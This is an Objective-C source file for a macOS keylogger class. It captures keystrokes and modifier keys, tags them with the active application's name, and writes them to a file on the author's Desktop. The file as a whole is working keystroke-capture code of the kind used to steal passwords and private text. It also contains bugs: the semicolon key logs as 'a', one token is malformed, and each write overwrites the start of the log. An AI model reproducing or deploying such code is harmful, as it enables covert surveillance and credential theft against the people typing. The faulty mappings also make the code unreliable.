//
//  Keylogger.m
//  Keylogger
//
//  Created by mosca1337 on 3/11/13.
//  Copyright (c) 2013 mosca1337. All rights reserved.
//

#import "Keylogger.h"
#import <Carbon/Carbon.h>

@implementation Keylogger

@synthesize logLine, lastApp;

- (id)init {
    logLine = [[NSMutableString alloc] init];
    lastApp = [[NSString alloc] init];
    return self;
}

- (void)handleKeyPress:(NSEvent*)event {
    
    //Get modifier keys
    NSUInteger modifierFlags = [event modifierFlags];
    [self logModifierKeys:modifierFlags];
    
    //Get keyCode and convert to character
    NSString *character = [self keyCodeConversion:[event keyCode]];
    [logLine appendString:character];
}

- (void)logModifierKeys:(NSUInteger)modifierFlags {
    
    bool isCapsLock = modifierFlags & NSAlphaShiftKeyMask;
    bool isShift = modifierFlags & NSShiftKeyMask;
    bool isControl = modifierFlags & NSControlKeyMask;
    bool isOption = modifierFlags & NSAlternateKeyMask;
    bool isCommand = modifierFlags & NSCommandKeyMask;
    
    bool wasCapsLock = previousFlags & NSAlphaShiftKeyMask;
    bool wasShift = previousFlags & NSShiftKeyMask;
    bool wasControl = previousFlags & NSControlKeyMask;
    bool wasOption = previousFlags & NSAlternateKeyMask;
    bool wasCommand = previousFlags & NSCommandKeyMask;
    
    if (isCapsLock && !wasCapsLock) {
        [logLine appendString:@"<Caps Lock>"];
    }
    if (!isCapsLock && wasCapsLock) {
        [logLine appendString:@"</Caps Lock>"];
    }
    if (isShift && !wasShift) {
        [logLine appendString:@"<Shift>"];
    }
    if (!isShift && wasShift) {
        [logLine appendString:@"</Shift>"];
    }
    if (isControl && !wasControl) {
        [logLine appendString:@"<Control>"];
    }
    if (!isControl && wasControl) {
        [logLine appendString:@"</Control>"];
    }
    if (isOption && !wasOption) {
        [logLine appendString:@"<Option>"];
    }
    if (!isOption && wasOption) {
        [logLine appendString:@"</Option>"];
    }
    if (isCommand && !wasCommand) {
        [logLine appendString:@"<Command>"];
    }
    if (!isCommand && wasCommand) {
        [logLine appendString:@"</Command>"];
    }
    
    previousFlags = modifierFlags;
}

- (void)writeLine {
    if (![logLine isEqualToString:@""]) {
        NSLog(@"%@",logLine);
        
        
        NSFileHandle *aFileHandle;
        NSString *aFile;
        
        aFile = @"/Users/mosca1337/Desktop/log"; //setting the file to write to
        
        aFileHandle = [NSFileHandle fileHandleForWritingAtPath:aFile]; //telling aFilehandle what file write to
        //[aFileHandle truncateFileAtOffset:[aFileHandle seekToEndOfFile]]; //setting aFileHandle to write at the end of the file
        
        [aFileHandle writeData:[logLine dataUsingEncoding:NSUTF8StringEncoding]]; //actually write the data
        
        [aFileHandle closeFile];
        //Wipe line
        [logLine setString:@""];
    }
}

- (void)appDidActivate:(NSNotification *)notification {
    //Get active workspace
    NSDictionary *userInfo = [notification userInfo];
    NSString *applicationInfo = [userInfo objectForKey:@"NSWorkspaceApplicationKey"];
    if (applicationInfo) {
        applicationInfo = [applicationInfo description];
    }
    
    //Get active app name
    NSString *appName = [self getAppName:applicationInfo];
    
    if (![appName isEqualToString:lastApp]) {
        //Add close app token
        NSString *closeAppToken = [NSString stringWithFormat:@"</%@>", lastApp];
        [logLine appendString:closeAppToken];

        //Start a new line in the log
        [self writeLine];
        
        //Record the app name in the new line
        NSString *appToken = [NSString stringWithFormat:@"<%@>", appName];
        [logLine appendString:appToken];
        
        lastApp = appName;
    }
}

- (NSString*)getAppName:(NSString*)appInfo {
    NSString *appName = NULL;
    @try {
        NSRange startRange = [appInfo rangeOfString:@"("];
        NSRange endRange = [appInfo rangeOfString:@" - "];
        NSRange searchRange = NSMakeRange(startRange.location + startRange.length ,
                                      (endRange.location - startRange.location) - 1);
        appName = [appInfo substringWithRange:searchRange];
        
        NSArray *names = [appName componentsSeparatedByString:@"."];
        if (names) {
            appName = [names objectAtIndex:[names count] - 1];
        }
    }
    @catch (NSException * e) {
        NSLog(@"Exception: %@", e);
    }
    return appName;
}

- (NSString*)keyCodeConversion:(unsigned short)keyCode {
    
    //Convert keyCode to string (no simple method around this)
    switch (keyCode) {
        case kVK_ANSI_A:                return @"a"; break;
        case kVK_ANSI_S:                return @"s"; break;
        case kVK_ANSI_D:                return @"d"; break;
        case kVK_ANSI_F:                return @"f"; break;
        case kVK_ANSI_H:                return @"h"; break;
        case kVK_ANSI_G:                return @"g"; break;
        case kVK_ANSI_Z:                return @"z"; break;
        case kVK_ANSI_X:                return @"x"; break;
        case kVK_ANSI_C:                return @"c"; break;
        case kVK_ANSI_V:                return @"v"; break;
        case kVK_ANSI_B:                return @"b"; break;
        case kVK_ANSI_Q:                return @"q"; break;
        case kVK_ANSI_W:                return @"w"; break;
        case kVK_ANSI_E:                return @"e"; break;
        case kVK_ANSI_R:                return @"r"; break;
        case kVK_ANSI_T:                return @"t"; break;
        case kVK_ANSI_Y:                return @"y"; break;
        case kVK_ANSI_1:                return @"1"; break;
        case kVK_ANSI_2:                return @"2"; break;
        case kVK_ANSI_3:                return @"3"; break;
        case kVK_ANSI_4:                return @"4"; break;
        case kVK_ANSI_6:                return @"6"; break;
        case kVK_ANSI_5:                return @"5"; break;
        case kVK_ANSI_Equal:            return @"="; break;
        case kVK_ANSI_9:                return @"9"; break;
        case kVK_ANSI_7:                return @"7"; break;
        case kVK_ANSI_Minus:            return @"-"; break;
        case kVK_ANSI_8:                return @"8"; break;
        case kVK_ANSI_0:                return @"0"; break;
        case kVK_ANSI_RightBracket:     return @"]"; break;
        case kVK_ANSI_O:                return @"o"; break;
        case kVK_ANSI_U:                return @"u"; break;
        case kVK_ANSI_LeftBracket:      return @"["; break;
        case kVK_ANSI_I:                return @"i"; break;
        case kVK_ANSI_P:                return @"p"; break;
        case kVK_ANSI_L:                return @"l"; break;
        case kVK_ANSI_J:                return @"j"; break;
        case kVK_ANSI_Quote:            return @"'"; break;
        case kVK_ANSI_K:                return @"k"; break;
        case kVK_ANSI_Semicolon:        return @"a"; break;
        case kVK_ANSI_Backslash:        return @"\\"; break;
        case kVK_ANSI_Comma:            return @","; break;
        case kVK_ANSI_Slash:            return @"/"; break;
        case kVK_ANSI_N:                return @"n"; break;
        case kVK_ANSI_M:                return @"m"; break;
        case kVK_ANSI_Period:           return @"."; break;
        case kVK_ANSI_Grave:            return @"`"; break;
        case kVK_ANSI_KeypadDecimal:    return @"."; break;
        case kVK_ANSI_KeypadMultiply:   return @"*"; break;
        case kVK_ANSI_KeypadPlus:       return @"+"; break;
        case kVK_ANSI_KeypadClear:      return @"<Clear>"; break;
        case kVK_ANSI_KeypadDivide:     return @"/"; break;
        case kVK_ANSI_KeypadEnter:      return @"<Enter>"; break;
        case kVK_ANSI_KeypadMinus:      return @"-"; break;
        case kVK_ANSI_KeypadEquals:     return @"="; break;
        case kVK_ANSI_Keypad0:          return @"0"; break;
        case kVK_ANSI_Keypad1:          return @"1"; break;
        case kVK_ANSI_Keypad2:          return @"2"; break;
        case kVK_ANSI_Keypad3:          return @"3"; break;
        case kVK_ANSI_Keypad4:          return @"4"; break;
        case kVK_ANSI_Keypad5:          return @"5"; break;
        case kVK_ANSI_Keypad6:          return @"6"; break;
        case kVK_ANSI_Keypad7:          return @"7"; break;
        case kVK_ANSI_Keypad8:          return @"8"; break;
        case kVK_ANSI_Keypad9:          return @"9"; break;

        case kVK_Return:                return @"<Return>"; break;
        case kVK_Tab:                   return @"<Tab>"; break;
        case kVK_Space:                 return @"<Space>"; break;
        case kVK_Delete:                return @"<Delete>"; break;
        case kVK_Escape:                return @"Escape"; break;
        case kVK_F1:                    return @"F1"; break;
        case kVK_F2:                    return @"F2"; break;
        case kVK_F3:                    return @"F3"; break;
        case kVK_F4:                    return @"F4"; break;
        case kVK_F5:                    return @"F5"; break;
        case kVK_F6:                    return @"F6"; break;
        case kVK_F7:                    return @"F7"; break;
        case kVK_F8:                    return @"F8"; break;
        case kVK_F9:                    return @"F9"; break;
        case kVK_F10:                   return @"F10"; break;
        case kVK_F11:                   return @"F11"; break;
        case kVK_F12:                   return @"F12"; break;
        case kVK_F13:                   return @"F13"; break;
        case kVK_F14:                   return @"F14"; break;
        case kVK_F15:                   return @"F15"; break;
        case kVK_F16:                   return @"F16"; break;
        case kVK_F17:                   return @"F17"; break;
        case kVK_F18:                   return @"F18"; break;
        case kVK_F19:                   return @"F19"; break;
        case kVK_F20:                   return @"F20"; break;
        case kVK_ForwardDelete:         return @"<Delete"; break;
        case kVK_LeftArrow:             return @"<Left Arrow>"; break;
        case kVK_RightArrow:            return @"<Right Arrow>"; break;
        case kVK_DownArrow:             return @"<Down Arrow>"; break;
        case kVK_UpArrow:               return @"<Up Arrow>"; break;
            
        default:
            return @"<Unknown>";
            break;
    }
}

@end
